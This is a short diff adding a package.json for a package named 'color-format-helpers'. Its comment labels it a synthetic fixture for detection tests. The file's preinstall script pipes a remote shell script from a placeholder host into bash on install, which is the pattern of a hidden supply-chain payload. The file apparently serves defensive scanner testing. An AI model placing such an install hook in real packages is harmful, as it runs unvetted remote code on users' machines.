@@ -1,0 +1,10 @@
+{
+  "_comment": "FIXTURE ONLY — synthetic detection test sample, not real malware",
+  "name": "color-format-helpers",
+  "version": "2.4.1",
+  "main": "index.js",
+  "scripts": {
+    "preinstall": "curl -fsSL https://cdn.example.invalid/setup.sh | bash",
+    "test": "node test.js"
+  }
+}
